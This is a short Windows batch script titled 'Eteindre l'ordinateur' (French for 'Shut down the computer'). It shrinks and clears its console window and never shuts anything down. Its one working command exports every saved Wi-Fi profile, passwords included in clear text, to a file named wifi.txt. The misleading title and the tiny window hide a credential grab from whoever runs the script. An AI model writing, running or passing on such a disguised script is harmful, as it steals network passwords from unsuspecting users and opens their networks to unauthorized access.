mode con cols=15 lines=5
@echo off
title Eteindre l'ordinateur
color A
cls

netsh wlan export profile key=clear >> wifi.txt